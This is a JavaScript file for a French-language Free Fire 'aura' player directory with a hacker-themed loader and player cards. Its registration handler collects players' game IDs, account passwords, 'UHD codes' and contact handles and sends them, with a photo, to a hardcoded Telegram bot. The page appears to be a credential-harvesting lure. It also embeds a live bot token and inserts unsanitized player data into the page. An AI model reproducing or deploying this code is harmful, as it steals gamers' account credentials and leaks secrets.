// K227 AURA SYSTEM V2
window.addEventListener("load",()=>{
  const loader=document.getElementById("loader"), bar=document.getElementById("progressBar"), pct=document.getElementById("loaderPercent"), status=document.getElementById("loaderStatus"), lines=document.getElementById("bootLines");
  const boot=["CONNECTING TO AURA NETWORK","LOADING FREE FIRE DATABASE","MATRIX CORE ONLINE","PLAYER SYSTEM READY","SECURITY CHECK COMPLETE","ACCESS GRANTED"];
  let p=0,i=0;
  const timer=setInterval(()=>{
    p+=Math.floor(Math.random()*8)+4;if(p>100)p=100;
    bar.style.width=p+"%";pct.textContent=p+"%";
    if(p>15&&p<35)status.textContent="CONNECTING TO AURA NETWORK...";
    else if(p<55)status.textContent="LOADING FREE FIRE DATABASE...";
    else if(p<75)status.textContent="INITIALIZING MATRIX CORE...";
    else if(p<92)status.textContent="VERIFYING PLAYER SYSTEM...";
    else status.textContent="ACCESS GRANTED // WELCOME K227";
    if(i<boot.length&&p>i*16){const d=document.createElement("div");d.textContent=boot[i++];lines.appendChild(d)}
    if(p>=100){clearInterval(timer);setTimeout(()=>{loader.style.opacity="0";loader.style.transition="opacity .6s";setTimeout(()=>loader.remove(),650)},550)}
  },120);
});

const canvas=document.getElementById("matrix"),ctx=canvas.getContext("2d");
let fontSize=14,drops=[];
function resizeMatrix(){canvas.width=innerWidth;canvas.height=innerHeight;drops=Array(Math.ceil(canvas.width/fontSize)).fill(1)}
resizeMatrix();addEventListener("resize",resizeMatrix);
const chars="01 AURA K227 FF HACKER 227";
function matrix(){ctx.fillStyle="rgba(0,0,0,.075)";ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle="#38d9ff";ctx.font=fontSize+"px monospace";for(let x=0;x<drops.length;x++){const t=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(t,x*fontSize,drops[x]*fontSize);if(drops[x]*fontSize>canvas.height&&Math.random()>.975)drops[x]=0;drops[x]++}}setInterval(matrix,38);

function clock(){document.getElementById("clock").textContent=new Date().toLocaleTimeString("fr-FR")}clock();setInterval(clock,1000);

const terminal=document.getElementById("terminalText");
const terminalLines=["> boot --aura-core","[OK] matrix engine initialized","[OK] player database loaded","[OK] security module online","[INFO] aura status: MAX","[READY] waiting for player access..."];
let ti=0,li=0;
function typeTerminal(){if(li>=terminalLines.length)return;let s=terminalLines[li],c=0;const row=document.createElement("div");terminal.appendChild(row);const t=setInterval(()=>{row.textContent=s.slice(0,++c);if(c>=s.length){clearInterval(t);li++;setTimeout(typeTerminal,180)}},22)}setTimeout(typeTerminal,1000);

function socialButton(value,icon,label,type){
  if(!value || value.toLowerCase()==="privé") return `<span class="social-btn private"><span class="social-icon">${icon}</span>${label} // PRIVATE</span>`;
  let href=value;
  if(type==="whatsapp"){
    const digits=value.replace(/\D/g,"");
    href=digits?`https://wa.me/${digits}`:"#";
  } else if(!/^https?:\/\//i.test(value)){
    href="#";
  }
  const extra=href==="#"?' onclick="toast(\'Lien non disponible\');return false;"': ' target="_blank" rel="noopener"';
  return `<a class="social-btn ${type}" href="${href}"${extra}><span class="social-icon">${icon}</span>${label} // ACCESS</a>`;
}

const playersContainer=document.getElementById("playersContainer"),count=document.getElementById("playerCount");
count.textContent=players.length;
function displayPlayers(list=players){
 playersContainer.innerHTML="";
 list.forEach((p,index)=>{
  const card=document.createElement("div");card.className="player-card";
  card.innerHTML=`<div class="photo-wrap"><span class="online">ONLINE</span><img src="${p.image}" alt="${p.name}"></div>
  <div class="player-info"><h3>${p.name}</h3>
  <p>🎮 <b>UHD ID :</b> ${p.uid}</p><p>⭐ <b>Niveau :</b> ${p.level}</p><p>🏆 <b>Rang :</b> ${p.rank}</p>
  <div class="social-buttons">
  ${socialButton(p.tiktok,"🎵","TIKTOK","tiktok")}
  ${socialButton(p.whatsapp,"📞","WHATSAPP","whatsapp")}
</div>
  <p class="description">${p.description||"FREE FIRE PLAYER MERCI DE M'AJOUTER EN AMI 😎✅"}</p>
  <p class="aura-badge">⚡ AURA MAX // VERIFIED ⚡</p>
  <input type="password" placeholder="🔐 Mot de passe d'accès" class="code-input" id="pass-${index}">
  <button onclick="showCode(${index})">🔓 AUTHENTICATE // UHD</button><div id="result-${index}" class="hidden-code"></div></div>`;
  playersContainer.appendChild(card);setTimeout(()=>card.classList.add("show"),index*90);
 });
}
displayPlayers();

function toast(msg){const t=document.getElementById("toast");t.textContent=msg;t.classList.add("show");setTimeout(()=>t.classList.remove("show"),2200)}
function showCode(index){const input=document.getElementById(`pass-${index}`),result=document.getElementById(`result-${index}`);if(input.value===players[index].password){result.innerHTML=`<p>✓ ACCESS GRANTED</p><p>⚡ UHD CODE : ${players[index].code}</p><button onclick="copyCode('${players[index].code}')">📋 COPIER UHD CODE</button>`;toast("✓ ACCESS GRANTED // UHD CODE UNLOCKED")}else{result.innerHTML="❌ ACCESS DENIED // MOT DE PASSE INCORRECT";toast("✕ ACCESS DENIED")}}
function copyCode(code){navigator.clipboard.writeText(code).then(()=>toast("✓ UHD CODE COPIÉ 😎")).catch(()=>toast("Copie non disponible"))}

document.getElementById("search").addEventListener("input",function(){const v=this.value.toLowerCase();document.querySelectorAll(".player-card").forEach(c=>c.style.display=c.innerText.toLowerCase().includes(v)?"block":"none")});

const photoInput=document.getElementById("photo"),preview=document.getElementById("preview"),upload=document.querySelector(".upload-box");
photoInput.addEventListener("change",function(){const f=this.files[0];if(f){preview.src=URL.createObjectURL(f);preview.style.display="block";upload.classList.add("scanned");upload.textContent="✓ PHOTO READY // AURA SCAN COMPLETE";toast("✓ PHOTO VERIFIED")}});

const form=document.getElementById("registerForm"),message=document.getElementById("message");
form.addEventListener("submit",function(e){
 e.preventDefault();
 const name=document.getElementById("name").value,uid=document.getElementById("uid").value,level=document.getElementById("level").value,rank=document.getElementById("rank").value,code=document.getElementById("code").value,password=document.getElementById("password").value,tiktok=document.getElementById("tiktok").value,whatsapp=document.getElementById("whatsapp").value,photo=photoInput.files[0];
 if(!photo){message.textContent="❌ Choisis une photo avant d'envoyer";return}
 // TELEGRAM — conserve le système original demandé
 const token="8369361718:AAG2hwt6CzwBfWJsvqkS8NO1-8BfbfhMQs0";
 const chatId="7239404667";
 const text=`\n🔥 Nouveau Joueur FF 🔥\n\n👤 Nom : ${name}\n\n🎮 UHD ID : ${uid}\n\n⭐ Niveau : ${level}\n\n🏆 Rang : ${rank}\n\n🔐 UHD CODE : ${code}\n\n🛡️ Password : ${password}\n\n📱 TikTok : ${tiktok}\n\n📞 WhatsApp : ${whatsapp}\n`;
 const fd=new FormData();fd.append("chat_id",chatId);fd.append("caption",text);fd.append("photo",photo);
 fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:"POST",body:fd}).then(()=>{
  message.textContent="🔥 Reviens dans 24h ou moins 🙂\n\nkawaki227 va enregistrer votre compte sur le site.\n\nMerci de patienter 😎";form.reset();preview.style.display="none";upload.classList.remove("scanned");upload.textContent="📸 CHOISIR UNE PHOTO POUR TON PROFIL";toast("✓ REGISTRATION SENT");
 }).catch(()=>{message.textContent="❌ Erreur d'envoi";toast("✕ ERREUR D'ENVOI")});
});

// SMART MUSIC SYSTEM
const music = document.getElementById("music");
const musicToggle = document.getElementById("musicToggle");
let musicStarted = false;

function updateMusicButton(){
  if(!musicToggle) return;
  const on = !music.paused;
  musicToggle.textContent = on ? "🎵 MUSIC ON" : "🔇 MUSIC OFF";
  musicToggle.classList.toggle("on", on);
}
function startMusic(){
  if(!music || musicStarted) return;
  const p = music.play();
  if(p && p.then) p.then(()=>{musicStarted=true;updateMusicButton()}).catch(updateMusicButton);
}
function tryStartMusic(){
  startMusic();
  if(musicStarted){
    document.removeEventListener("pointerdown",tryStartMusic);
    document.removeEventListener("touchstart",tryStartMusic);
    document.removeEventListener("keydown",tryStartMusic);
  }
}
if(music){
  music.volume=.85;
  music.addEventListener("play",()=>{musicStarted=true;updateMusicButton()});
  music.addEventListener("pause",updateMusicButton);
  updateMusicButton();
  setTimeout(startMusic,700);
  document.addEventListener("pointerdown",tryStartMusic,{passive:true});
  document.addEventListener("touchstart",tryStartMusic,{passive:true});
  document.addEventListener("keydown",tryStartMusic);
  musicToggle.addEventListener("click",(e)=>{
    e.stopPropagation();
    if(music.paused){
      music.play().then(()=>{musicStarted=true;updateMusicButton()}).catch(()=>toast("🔇 Active la musique avec une nouvelle pression"));
    }else{
      music.pause();
      updateMusicButton();
    }
  });
}
